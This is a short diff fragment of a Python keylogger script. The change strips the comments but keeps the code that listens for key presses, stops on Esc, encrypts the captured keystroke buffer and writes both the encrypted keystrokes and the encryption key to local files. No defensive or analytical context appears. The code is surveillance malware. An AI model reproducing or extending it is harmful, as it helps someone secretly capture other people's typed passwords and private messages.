@@ -22,21 +22,17 @@ def on_press(key):
 
 def on_release(key):
     if key == keyboard.Key.esc:
-        # Stop the keylogger if the user presses the 'Esc' key
         return False
 
 
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
 
-# Encrypt the captured text buffer
 encrypted_data = cipher_suite.encrypt(bytes(text_buffer, 'utf-8'))
 
-# Write the encrypted data to a file
 with open('encrypted_keystrokes', 'wb') as f:
     f.write(encrypted_data)
 
-# Save the encryption key to a separate file
 with open('encryption_key.txt', 'wb') as f:
     f.write(encryption_key)
 
